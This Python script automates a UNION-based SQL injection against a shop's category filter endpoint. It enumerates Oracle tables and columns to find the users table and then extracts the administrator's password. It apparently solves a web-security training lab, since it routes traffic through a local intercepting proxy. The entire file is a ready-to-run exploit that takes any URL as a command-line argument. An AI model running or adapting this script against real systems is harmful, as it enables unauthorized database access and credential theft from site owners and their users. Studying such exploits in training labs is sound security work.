import requests
import sys
import urllib3 
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_request(url, sql_payload):
    path = '/filter?category=Accessories'
    response = requests.get(
        url + path + sql_payload,
        verify=False,
        proxies=proxies)
    return response.text

def get_users_table(url):
    sql_payload = (
        "' UNION SELECT table_name, "
        "NULL FROM user_tables--")
    response = get_request(
        url,
        sql_payload)
    if "USERS" in response:
        html = BeautifulSoup(
            response,
            'html.parser')
        users_table = html.find(
            string=re.compile('^USERS_.*'))
        return users_table
    raise ValueError("Could not find the users table.")

def get_users_columns(url, users_table):
    sql_payload = (
        "' UNION SELECT column_name, NULL "
        "FROM user_tab_columns WHERE table_name = '%s'-- " % users_table)
    response = get_request(
        url,
        sql_payload)
    if "USERNAME" in response and "PASSWORD" in response:
        html = BeautifulSoup(
            response,
            'html.parser')
        username_column = html.find(
            string=re.compile('.*USERNAME.*'))
        password_column = html.find(
            string=re.compile('.*PASSWORD.*'))
        return username_column, password_column
    raise ValueError("Could not find username or password columns.")

def get_password(
        url,
        users_table,
        username_column,
        password_column):
    sql_payload = (
        "' UNION select %s, %s " 
        "from %s--" % (username_column, password_column, users_table))
    response = get_request(
        url,
        sql_payload)
    if "administrator" in response:
        html = BeautifulSoup(
            response,
            'html.parser')
        admin_password = html.body.find(
            string="administrator").parent.findNext('td').contents[0]
        return admin_password
    raise ValueError("Could not find administrator password.")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        
        print("Looking for a users table...")
        users_table = get_users_table(url)
        print("Found the users table name: %s" % users_table)

        print("Looking for the username and password columns...")
        username_column, password_column = get_users_columns(url, users_table)
        print("Found the username column name: %s" % username_column)
        print("Found the password column name: %s" % password_column)

        print("Looking for the administrator password...")
        password = get_password(
            url,
            users_table,
            username_column,
            password_column)
        print("[+] The administrator password is: %s " % password)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The SQLi attack was not successful.")
        sys.exit(FAIL)   